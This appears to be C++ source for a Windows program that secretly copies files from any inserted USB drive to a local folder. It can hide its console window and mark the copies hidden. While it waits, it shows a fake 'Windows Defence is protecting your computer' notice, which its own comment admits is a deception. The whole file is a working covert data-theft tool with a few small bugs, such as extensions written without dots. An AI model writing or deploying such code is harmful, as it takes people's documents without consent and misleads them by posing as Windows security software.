#include<iostream>
#include<ctime>
#include<windows.h>
#include<boost/filesystem.hpp>
using namespace std;
using namespace boost::filesystem;


////////////////      控制台      \\\\\\\\\\\\\\\\\


const char targetExtension[][32]
{
	//要复制的文件的格式
	//全部文件使用: "*.*"
	//"*.*",
	".exe",
	".txt",
	".pptx",
	"docx",
	"xlsx",
};

#define RESERVE_DIRECTORY	true	// * 连同目录一起复制
#define LOG_FILE			true	// * 日志文件
#define LF_LOCATION			""		// * 日志文件输出位置
#define DELAY_TIME			3		//扫描间隔时间(单位:秒)
#define SHOW_CONSOLE		true	//是否显示控制台
#define SHOW_FILES			true	//是否列出文件列表在控制台
#define OVERWRITER			true	//是否覆盖已有文件
#define FILENAME_ENCRYPT	true	// * 是否加密文件名(加密方式:键对值)
#define HIDE_FILE			false	//隐藏被复制的文件
#define DESTINATION			"D:/"	//复制文件的目的地

////////////////      控制台      \\\\\\\\\\\\\\\\\


int getRemovableDriver(char(*remDrvList)[4])
{
	char drvString[1024]{};
	int drvTotal = GetLogicalDriveStringsA(1024, drvString) / 4;
	int count = 0;
	for (int i = 0; i < drvTotal; i++)
	{
		if (GetDriveTypeA(drvString + i * 4) == DRIVE_REMOVABLE)
		{
			strcpy_s(remDrvList[count++], 4, drvString + i * 4);
		}
	}
	return count;
}

void fileNameEncrypt(char* fileName)
{

}

void copyFiles(const char* src)
{
	for (recursive_directory_iterator iter(path(src, native)), end; iter != end; iter++)
	{
		if (!is_directory(*iter))
		{
			for (int i = 0; targetExtension[i][0] != (char)'\0'; i++)
			{
				if (strcmp(iter->path().extension().string().c_str(), targetExtension[i]) == 0)
				{
					char srcFilePath[1024]{};
					strcat_s(srcFilePath, 1024, iter->path().root_path().string().c_str());
					strcat_s(srcFilePath, 1024, iter->path().relative_path().string().c_str());
					char desFilePath[1024]{};
					strcat_s(desFilePath, 1024, DESTINATION);
					strcat_s(desFilePath, 1024, iter->path().filename().string().c_str());

					bool copySuccess = CopyFileA(srcFilePath, desFilePath, !OVERWRITER);

					if (SHOW_FILES)
					{
						for (int i = 0; i < 1024; i++)if (srcFilePath[i] == (char)'\\')srcFilePath[i] = (char)'/';
						for (int i = 0; i < 1024; i++)if (desFilePath[i] == (char)'\\')desFilePath[i] = (char)'/';
						if (copySuccess)
						{
							if (HIDE_FILE)
							{
								cout << "|SUCCESS ";
							}
							else cout << "|SUCCESS| " << srcFilePath << " -> " << desFilePath << endl;
						}
						//要么是已经隐藏了的文件，不然就是真的复制失败了。
						else cout << "|FAIL| " << srcFilePath << endl;
					}

					if (HIDE_FILE)
					{
						DWORD oldAttribute = GetFileAttributesA(srcFilePath);
						if (SetFileAttributesA(desFilePath, oldAttribute | FILE_ATTRIBUTE_HIDDEN) && SHOW_FILES)
							cout << "(HIDDEN)| " << srcFilePath << " -> " << desFilePath << endl;
					}

					break;
				}
			}
		}
	}
}


int main()
{
	HWND hwnd = GetForegroundWindow();
	if (SHOW_CONSOLE)
	{
		ShowWindow(hwnd, SW_SHOW);
	}
	else
	{
		ShowWindow(hwnd, SW_HIDE);
	}


again:

	while (true)
	{
		char remDrvList[32][4]{};
		int remDrvCount = 0;

		remDrvCount = getRemovableDriver(remDrvList);

		do
		{
			time_t t = time(nullptr);
			char strTime[128]{};
			ctime_s(strTime, 128, &t);
			strTime[strlen(strTime) - 1] = (char)'\0';
			//扯鬼
			cout << "[" << strTime << "] Windows Denfence 正在保护你的电脑,请不要关闭该窗口" << endl;
			Sleep(3 * 1000);
		} while (remDrvCount == 0);

		for (int i = 0; i < remDrvCount; i++)
		{
			try
			{
				copyFiles(remDrvList[i]);
			}
			catch (filesystem_error e)
			{
				cerr << e.what() << endl;
				goto again;
			}
		}
	}
}